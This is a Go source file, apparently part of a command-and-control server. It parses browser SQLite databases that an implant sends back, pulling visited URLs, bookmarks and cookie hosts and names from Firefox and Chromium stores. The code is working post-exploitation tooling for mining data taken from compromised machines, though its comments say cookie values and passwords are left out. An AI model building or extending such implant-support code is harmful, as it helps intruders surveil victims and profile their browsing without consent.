// Package browser: parse browser SQLite stores that the implant streams back.
// Only non-credential columns are selected — cookie values and password blobs
// are never queried.
package browser

import (
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

var ErrKind = errors.New("unknown query kind")

// QuerySpec keeps the SQL and the column order for each supported store.
type QuerySpec struct {
	Columns []string
	SQL     string
}

var firefoxQueries = map[string]QuerySpec{
	"history": {
		Columns: []string{"url", "title", "visits", "last_visit"},
		SQL: `select url, coalesce(title,'') as title, visit_count as visits,
       datetime(last_visit_date/1000000,'unixepoch','localtime') as last_visit
  from moz_places where hidden = 0 and last_visit_date is not null
 order by last_visit_date desc limit 800`,
	},
	"bookmarks": {
		Columns: []string{"folder", "name", "url"},
		SQL: `select coalesce(f.title,'') as folder, coalesce(b.title,'') as name, p.url
  from moz_bookmarks b
  join moz_places p on p.id = b.fk
  left join moz_bookmarks f on f.id = b.parent
 where b.type = 1 and p.url is not null
 order by b.parent, b.position limit 2000`,
	},
}

var queries = map[string]QuerySpec{
	"history": {
		Columns: []string{"url", "title", "visits", "last_visit"},
		SQL: `select url, coalesce(title,'') as title, visit_count as visits,
       datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime') as last_visit
  from urls where url not like 'chrome-extension://%'
 order by last_visit_time desc limit 800`,
	},
	"bookmarks": {
		// Firefox only: Chrome keeps bookmarks in a JSON file we already parse.
		Columns: []string{"folder", "name", "url"},
		SQL: `select coalesce(f.title,'') as folder, coalesce(b.title,'') as name, p.url
  from moz_bookmarks b
  join moz_places p on p.id = b.fk
  left join moz_bookmarks f on f.id = b.parent
 where b.type = 1 and p.url is not null
 order by b.parent, b.position limit 2000`,
	},
	"cookies": {
		// metadata only: host, name and expiry. No value/encrypted_value.
		Columns: []string{"host", "name", "expires"},
		SQL: `select host_key as host, name,
       case when expires_utc = 0 then 'session'
            else datetime(expires_utc/1000000-11644473600,'unixepoch','localtime') end as expires
  from cookies order by expires_utc desc limit 800`,
	},
}

func Spec(kind string) (QuerySpec, bool) {
	q, ok := queries[strings.ToLower(kind)]
	return q, ok
}

// Known reports whether the kind is valid for at least one browser family.
func Known(kind string) bool {
	kind = strings.ToLower(kind)
	if _, ok := queries[kind]; ok {
		return true
	}
	_, ok := firefoxQueries[kind]
	return ok
}

// Run writes the database bytes to a temp file and runs the sqlite3 CLI against
// it. Returns columns and rows in the declared order.
func Run(data []byte, kind string) ([]string, [][]string, error) {
	kind = strings.ToLower(kind)
	if !Known(kind) {
		return nil, nil, ErrKind
	}
	bin, err := exec.LookPath("sqlite3")
	if err != nil {
		return nil, nil, fmt.Errorf("sqlite3 not found on the platform host: %w", err)
	}
	dir, err := os.MkdirTemp("", "c2-browser-")
	if err != nil {
		return nil, nil, err
	}
	defer os.RemoveAll(dir)
	path := filepath.Join(dir, kind+".sqlite")
	if err := os.WriteFile(path, data, 0o600); err != nil {
		return nil, nil, err
	}
	spec := pickSpec(bin, path, kind)
	out, err := exec.Command(bin, "-readonly", "-json", path, spec.SQL).CombinedOutput()
	if err != nil {
		msg := strings.TrimSpace(string(out))
		if msg == "" {
			msg = err.Error()
		}
		if len(msg) > 300 {
			msg = msg[:300]
		}
		return nil, nil, fmt.Errorf("sqlite3: %s", msg)
	}
	trimmed := strings.TrimSpace(string(out))
	if trimmed == "" {
		return spec.Columns, [][]string{}, nil
	}
	var records []map[string]any
	if err := json.Unmarshal([]byte(trimmed), &records); err != nil {
		return nil, nil, fmt.Errorf("sqlite3 output: %w", err)
	}
	rows := make([][]string, 0, len(records))
	for _, rec := range records {
		row := make([]string, len(spec.Columns))
		for i, col := range spec.Columns {
			row[i] = cell(rec[col])
		}
		rows = append(rows, row)
	}
	return spec.Columns, rows, nil
}

// pickSpec sniffs the schema so the same "history" kind works for Firefox
// (moz_places) and Chromium (urls) stores.
func pickSpec(bin, path, kind string) QuerySpec {
	probe, err := exec.Command(bin, "-readonly", path,
		"select name from sqlite_master where name in ('moz_places','urls')").Output()
	if err == nil && strings.Contains(string(probe), "moz_places") {
		if q, ok := firefoxQueries[kind]; ok {
			return q
		}
	}
	return queries[kind]
}

func cell(v any) string {
	switch t := v.(type) {
	case nil:
		return ""
	case string:
		return t
	case float64:
		return strings.TrimSuffix(fmt.Sprintf("%.2f", t), ".00")
	default:
		return fmt.Sprint(t)
	}
}
